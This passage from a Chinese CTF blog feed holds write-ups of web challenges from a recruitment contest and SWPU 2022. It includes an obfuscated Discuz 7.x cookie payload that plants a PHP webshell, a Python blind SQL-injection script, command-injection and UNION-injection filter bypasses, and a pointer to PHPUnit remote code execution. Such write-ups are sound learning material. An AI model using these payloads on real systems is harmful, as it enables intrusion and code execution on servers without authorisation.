603788:/var/www/html/</code><br>ÂÆπÂô®id‰∏çÁî®ÂÜôÂÖ®Âè™Ë¶ÅËÉΩËØÜÂà´Âá∫Êù•Â∞±Ë°åÔºåÊâßË°å‰πãÂêéËÆøÈóÆÂ∞±Ë°å<br>ËÆøÈóÆ<code>ÊúçÂä°Âô®ip:2333</code><br><img src="https://s1.ax1x.com/2022/12/15/zo02WQ.png" alt="zo02WQ.png"><br>Â∏ÉÁΩÆÊàêÂäü<br><img src="https://s1.ax1x.com/2022/12/15/zo0cFS.png" alt="zo0cFS.png"><br>ÁÑ∂ÂêéÊäìÂåÖÂæóÂà∞flag<br><img src="https://s1.ax1x.com/2022/12/15/zo0gJg.png" alt="zo0gJg.png"><br>ÁÑ∂ÂêéÂ∞±ÊòØdockerfileÂíådocker-compose.ymlÁöÑÁºñÂÜôÔºåÁî®Êù•Âø´ÈÄüÊú¨Âú∞ÈÉ®ÁΩ≤ÂíåÂä®ÊÄÅflagÂÆûÁé∞Á≠âÔºåËøôÈáåÂ∞±ÂÖà‰∏çÂÜô‰∫Ü,ÂΩìÁÑ∂ÈÇ£‰∏™‰πüÊòØÂæàÈáçË¶ÅÁöÑ‰∏úË•ø<br>ÊúÄÂêéËøôÈáåÂàó‰∏Ä‰∏ãÊàëÊúÄËøëÁªèÂ∏∏Áî®ÁöÑÂëΩ‰ª§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exit //ÈÄÄÂá∫ÂÆπÂô®</span><br><span class="line">systemctl restart docker  //ÈáçÂêØdocker</span><br><span class="line">docker start ÂÆπÂô®id  //ÂºÄÂêØ‰∏Ä‰∏™Â∑≤Áü•idÁöÑÂÆπÂô®</span><br><span class="line">docker restart ÂÆπÂô®id  //ÈáçÊñ∞ÂêØÂä®ÂÆπÂô®</span><br><span class="line">docker exec -it  ÂÆπÂô®id bash  //ÈÄÄÂá∫ÂÆπÂô®ÂêéÂÆπÂô®‰∏çÂÖ≥Èó≠</span><br><span class="line">docker stop ÂÆπÂô®id  //ÁªìÊùüÂÆπÂô®</span><br><span class="line">docker ps  //Êü•ÁúãÊ≠£Âú®ËøêË°åÁöÑÂÆπÂô®</span><br><span class="line">docker image ls  //Êü•ÁúãÈïúÂÉèÁõÆÂΩï</span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉÔºö<br><a href="https://blog.csdn.net/Cypher_X/article/details/115359957">CTF WebÂá∫È¢òÊÑüÊÇü_WuuconixÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_ctf webÂá∫È¢ò</a><br><a href="https://blog.csdn.net/m0_62422842/article/details/126604577?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=5">Áî®dockerÊê≠Âª∫ÁÆÄÊòìctfÈ¢òÁõÆ_XiLitterÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢_ctfÈ¢òÁõÆdocker</a></p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Âº±Âè£‰ª§ÊãõÊñ∞Ëµõwp(ÈÉ®ÂàÜ)</title>
      <link href="/2022/11/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8B%9B%E6%96%B0%E8%B5%9Bwp-%E9%83%A8%E5%88%86/"/>
      <url>/2022/11/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8B%9B%E6%96%B0%E8%B5%9Bwp-%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Á≠æÂà∞Â∞èËÉΩÊâã"><a href="#Á≠æÂà∞Â∞èËÉΩÊâã" class="headerlink" title="Á≠æÂà∞Â∞èËÉΩÊâã"></a>Á≠æÂà∞Â∞èËÉΩÊâã</h2><p>Áõ¥Êé•Êâ´ÁõÆÂΩïÂèëÁé∞Êúâ‰∏™index.php.bak‰∏ãËΩΩÊâìÂºÄÂæóÂà∞</p><h2 id="ÂºÄËÉÉËèú"><a href="#ÂºÄËÉÉËèú" class="headerlink" title="ÂºÄËÉÉËèú"></a>ÂºÄËÉÉËèú</h2><p>lsÊ†πÁõÆÂΩïÁúãÂà∞flag<br><img src="https://s1.ax1x.com/2022/11/19/zuy5qO.png" alt="zuy5qO.png"><br>ÁÑ∂ÂêécatÔºåËøôÈáåÂ•ΩÂÉèÂèØ‰ª•ÂøΩÁï•Á©∫Ê†ºÔºåÂèØËÉΩÊòØÈùûÈ¢ÑÊúüÂêßÔºåËøôÈáå‰πüÂèØ‰ª•Áî®nlÁõ¥Êé•Âá∫Êù•<br><img src="https://s1.ax1x.com/2022/11/19/zuy4sK.png" alt="zuy4sK.png"></p><h2 id="Â∞èÈïáÂÅöÈ¢òÂÆ∂"><a href="#Â∞èÈïáÂÅöÈ¢òÂÆ∂" class="headerlink" title="Â∞èÈïáÂÅöÈ¢òÂÆ∂"></a>Â∞èÈïáÂÅöÈ¢òÂÆ∂</h2><p>Êâ´Âá∫Êù•robots.txtÔºåËÆøÈóÆ&#x2F;GAME&#x2F;index.htmlÊü•Áúãjs‰ª£Á†Å<br><img src="https://s1.ax1x.com/2022/11/19/zuyWxx.png" alt="zuyWxx.png"><br>base64Ëß£Á†ÅËÆøÈóÆ&#x2F;GAME&#x2F;f14g_in_there_hha&#x2F;index.php<br>ÁÑ∂ÂêéGAME&#x2F;f14g_in_there_hha&#x2F;index.php?payload&#x3D;;cat%09&#x2F;*</p><h2 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h2><p>ÂèÇËÄÉËøôÁØáÊñáÁ´†(<a href="https://cloud.tencent.com/developer/article/1541130">Discuz 7.x&#x2F;6.x ÂÖ®Â±ÄÂèòÈáèÈò≤Âæ°ÁªïËøáÂØºËá¥‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂ§çÁé∞ - ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com)</a>)<br>Áõ¥Êé•ËÆøÈóÆÂ≠òÂú®ÊºèÊ¥ûÁöÑÂú∞Êñπ‰ΩÜÊòØÂú®tidËøôÈáåÂõ∞‰∫ÜÂæà‰πÖ<br><img src="https://s1.ax1x.com/2022/11/19/zuyhM6.png" alt="zuyhM6.png"><br>ÁÑ∂Âêé‰∏ÄÁõ¥ÊâæÁªà‰∫éÂèàÊâæÂà∞‰∏ÄÁØáÂçöÂÆ¢(<a href="https://www.freebuf.com/vuls/262488.html">discuz7.2ÊºèÊ¥ûÂ§çÁé∞‚ÄìpythonÁºñÂÜôpoc - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a>)</p><p><img src="https://s1.ax1x.com/2022/11/19/zuyRR1.png" alt="zuyRR1.png"></p><p>Áõ¥Êé•tidÊîπ‰∏∫10ÔºåËøêÊ∞î‰∏çÈîôÊãøÂà∞shell<br><img src="https://s1.ax1x.com/2022/11/19/zuyTde.png" alt="zuyTde.png"><br>Êé•‰∏ãÊù•ÊääwebshellÂÜôÂÖ•ÔºåpayloadÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</span><br></pre></td></tr></table></figure><p>ÂêåÊ†∑‰º†ÁªôcookieÔºåËøôÈáåÊòØÂàõÂª∫‰∫Ü‰∏Ä‰∏™wf.phpÂØÜÁ†Å‰∏∫lalalalÔºåËÆøÈóÆ‰∏Ä‰∏ãËøô‰∏™ÁïåÈù¢<br><img src="https://s1.ax1x.com/2022/11/19/zuyoZD.png" alt="zuyoZD.png"><br>Ê≤°ÊúâÊä•ÈîôËØ¥ÊòéÂÜôÂÖ•ÊàêÂäüÔºåËöÅÂâëËøû‰∏äÁªàÁ´ØcatÂ∞±Ë°å<br><img src="https://s1.ax1x.com/2022/11/19/zucTCd.png" alt="zucTCd.png"></p><h2 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h2><p>Ëøô‰∏™È¢òÊØîËµõÊó∂Ê≤°ÂºÑÂá∫Êù•ÔºålimitÊ≥®ÂÖ•‰∏çÂ§™ÁÜüÊÇâ</p><p><img src="https://s1.ax1x.com/2022/11/19/zu2uTS.png" alt="zu2uTS.png"><br>ÈúÄË¶Å‰º™ÈÄ†ipÁî®X-Forwarded-For:127.0.0.1Êù•‰º™ÈÄ†<br><img src="https://s1.ax1x.com/2022/11/19/zucbvt.png" alt="zucbvt.png"><br>‰ΩÜÊòØË∑≥ËΩ¨Âà∞302‰∫ÜÂπ∂‰∏îÁôªÂΩïÂ§±Ë¥•ÔºåÊúÄÂêéÁî®limitÊâæÂà∞Ê≥®ÂÖ•ÁÇπ<br><img src="https://s1.ax1x.com/2022/11/19/zuc78A.png" alt="zuc78A.png"><br><img src="https://s1.ax1x.com/2022/11/19/zucI4H.png" alt="zucI4H.png"><br>Áõ≤Ê≥®ÂÜôËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://d9960516-2ae7-4792-806e-90afce237a56.recruit.qsnctf.com:8080/login.php&#x27;</span>  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  </span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line">    left = <span class="number">32</span>  </span><br><span class="line">    right = <span class="number">127</span>  </span><br><span class="line">    mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> left &lt; right:  </span><br><span class="line">        payload_flag=payload.<span class="built_in">format</span>(i,mid)  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload_flag  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.post(headers=headers, url=url, data=data, allow_redirects=<span class="literal">True</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ÁôªÈôÜÊàêÂäü&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            left = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            right = mid  </span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">127</span> <span class="keyword">or</span> mid == <span class="number">32</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    flag += <span class="built_in">chr</span>(right)  </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/19/zu2cm6.png" alt="zu2cm6.png"></p><p>Ëøô‰∏™ËÑöÊú¨ÊúâÁÇπÈóÆÈ¢òÔºåÂè™ÊúâÁàÜflagÁöÑpayloadÊúâÁî®ÔºåÂÖ∂ÂÆÉÁöÑ‰∏çÂÆåÊï¥ÔºåÂêéÈù¢Â§çÁé∞ÂÜçÊù•ÊîπÊîπ</p><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><p>Áõ¥Êé•Êâ´ÁõÆÂΩïÊúâ‰∏™adminÔºåÁÑ∂ÂêéÁôªÂΩïÔºåÁúãÊ∫êÁ†ÅÂèëÁé∞È™åËØÅÁ†ÅÊòØÂõæÁâáÔºåÈÇ£‰πàÂ∫îËØ•‰∏çÊòØËøõÂÖ•ÂêéÂè∞‰∫ÜÔºåÂú®url‰∏äÈù¢ÂèëÁé∞base64Âä†ÂØÜÁöÑ‰∏úË•øËß£Á†Å‰∏Ä‰∏ã<br><img src="https://s1.ax1x.com/2022/11/19/zu2OAS.png" alt="zu2OAS.png"><br>Âú®Ëøô‰∏™ÁõÆÂΩï‰∏ã‰ΩÜÊòØÂÆÉÊòØ‰∏çÂèØËÆøÈóÆÁöÑÔºå‰∫éÊòØËØï‰∫Ü‰∏ÄÁ≥ªÂàóÁªïËøáÁªìÊûú‰∏çË°åÔºå<br><img src="https://s1.ax1x.com/2022/11/19/zucLKP.png" alt="zucLKP.png"><br>ÁúãÂà∞Ëøô‰∏™ÁõÆÂΩïÊúâ‰∏™evalÂáΩÊï∞ÂèØËÉΩÊúâÈóÆÈ¢òÔºåÊûú‰∏çÂÖ∂ÁÑ∂(<a href="https://blog.csdn.net/weixin_43416469/article/details/114157361">PHPUnitËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-9841 ÊºèÊ¥ûÂ§çÁé∞_ADummy_ÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a>)<br>ËøôÈáåÊú®È©¨ÊòØÂÜô‰∏çËøõÂéªÁöÑÔºåÁõ¥Êé•ÊâßË°åphpinfoÁÑ∂ÂêéÊêúÁ¥¢flag<br><img src="https://s1.ax1x.com/2022/11/19/zucHgI.png" alt="zucHgI.png"><br>Êèê‰∫§ÊòØÂÅáflagÁ¶ª‰∫Ü‰∏™Â§ßË∞±ÔºåÁÑ∂ÂêéÂõûÂéªcat‰∏Ä‰∏ãÂá∫Êù•‰∫Ü<br><img src="https://s1.ax1x.com/2022/11/19/zucODf.png" alt="zucODf.png"></p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>‰∏ÄÂºÄÂßãÊâæ‰∫ÜËøô‰∏™WeblogicÁöÑSSRFÊºèÊ¥û‰ΩÜÊòØÂÜÖÁΩëip‰∏ÄÁõ¥ÂºÑ‰∏çÂá∫Êù•ÔºåÊç¢ÊÄùË∑ØÂèëÁé∞Â•ΩÂÉè‰∏çÊòØËøô‰∏™Ê¥û<br>(<a href="https://blog.csdn.net/yumengzth/article/details/97522783">https://blog.csdn.net/yumengzth/article/details/97522783</a>)<br>ÂèÇËÄÉËøô‰∏™ÔºåÂà©Áî®Â∑•ÂÖ∑Âá∫Êù•<br><img src="https://s1.ax1x.com/2022/11/19/zucxUg.png" alt="zucxUg.png"></p><p>ÂæàÈÅóÊÜæÊúÄÁªàÊ≤°ËÉΩËøõÂÖ•Ââç30</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022SWPUÊú™Ëß£È¢òÂ§çÁé∞</title>
      <link href="/2022/11/SWPU%E6%9C%AA%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/11/SWPU%E6%9C%AA%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h2><p>Ëøô‰∏™È¢ò‰∏ÄÂºÄÂßãÂ∞±Ê≤°ÂÅöÔºå‰∏çÁü•ÈÅìË¥¶Âè∑ÂíåÂØÜÁ†ÅÁÆóÊòØ‰ªñ‰ª¨ÂÜÖÈÉ®È¢òÂêß</p><p><img src="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png" alt="xzm2WT.md.png"></p><p>ÁÑ∂ÂêéËøõÂéª‰πãÂêéÁúãÊ∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Ëøô‰∏∫‰ΩïÁõ∏Á≠âÂèà‰∏çÁõ∏Á≠â&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÊàëÂç°‰∫Ü‰∏Ä‰∏ã‰∏ÄÁõ¥Âú®Á∫†Áªì<code>intval</code>Ëøô‰∏™ÂáΩÊï∞Ôºå‰ΩÜÊòØËøôÈáåÂÖ∂ÂÆû‰∏çÊòØËÄÉËøô‰∏™ÂáΩÊï∞ËÄåÊòØËÄÉPHPÂº±ÊØîËæÉ<br>ÊâÄ‰ª•payloadÔºö<code>?num=12345a</code><br><img src="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png" alt="xzmWSU.md.png"></p><h2 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h2><p>Ëøô‰∏™È¢òÈÇ£Âº†ÂõæÁâáÂÆûÂú®ÊòØÊ≤°ÁúãÊ∏ÖÈÇ£‰∏™ÈÖíÂ∫óÂè´Âï•ÂêçÂ≠ó<br>Â±±Ê∞¥Èó¥Âè§ËøπÈÖíÂ∫óÁôæÂ∫¶Âú∞ÂõæÊâæÂà∞<br><img src="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png" alt="xzmOSO.md.png"><br>ËæìÂÖ•ÂÆ¢ÊúçÁîµËØùÂéªÊéâÂ≠óÁ¨¶Â∞±Ë°å<br><img src="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png" alt="xzmqfK.md.png"></p><h2 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h2><p>ÂâçÈù¢ÊäìÂåÖÂèëÁé∞1.jsÔºåÁÑ∂ÂêéÊúâ‰∏™NsScTf.phpËøô‰∫õÊ≠•È™§ÂÖàËøáÂΩìÊó∂‰∏çÊòØÂç°Âú®ËøôÈáå<br>ËøõÂÖ•NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//hint: ‰∏égetÁõ∏‰ººÁöÑÂè¶‰∏ÄÁßçËØ∑Ê±ÇÂçèËÆÆÊòØ‰ªÄ‰πàÂë¢  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;  </span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âç°Âú®ËøôÈáåÔºå‰∏ÄÂºÄÂßãÁúãÈÇ£‰∏™hint‰ª•‰∏∫ÊòØÁî®HEADËØ∑Ê±Ç‰ΩÜ‰∏çÊòØ<br>Âà©Áî®<code>call_user_func</code>ÂáΩÊï∞ÔºåÁõ¥Êé•ÁúãpayloadÔºö<code>?p=Nss::Ctf</code>Áî®Â§ßÂÜôÁªïËøáÊ≠£ÂàôÂåπÈÖçÊ®°ÂºèÊòØmÊâÄ‰ª•ÂèØ‰ª•Áî®Â§ßÂÜôÁªïËøá‰∏ªË¶ÅÊòØËøôÈáåÂèØ‰ª•Áî®<code>::</code>Êù•ËøõÂÖ•ctfËøô‰∏™ÂáΩÊï∞<br><img src="https://s1.ax1x.com/2022/11/08/xznkp8.md.png" alt="xznkp8.md.png"><br>ÊèêÁ§∫nss2,ÂêåÊ†∑ÁöÑÂà©Áî®ÊñπÊ≥ï<br><img src="https://s1.ax1x.com/2022/11/08/xzniff.png" alt="xzniff.png"><br>flagÂú®Ê∫êÁ†Å</p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>Ëøô‰∏™È¢òÂΩìÊó∂Ê≤°ÂÅöÂá∫Êù•‰∏ÄÂºÄÂßãÊ≤°ÊâæÂà∞ÁªïËøáÊñπÂºèÔºåÂêéÈù¢Ê≤°ÂÅö‰∫Ü</p><p>Áî®post‰º†ÂèÇ ËøáÊª§‰∫Ü <code>or Á©∫Ê†º union</code><br>ÁàÜË°®<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn31U.png" alt="xzn31U.png"><br>ÁàÜÂàó<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xznGX4.png" alt="xznGX4.png"><br>Â≠óÊÆµ<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn8cF.png" alt="xzn8cF.png"></p><h2 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h2><p>Ëøô‰∏™popÈìæÂÅöÁöÑÊó∂ÂÄôÊ≤°ÁúãÊáÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) 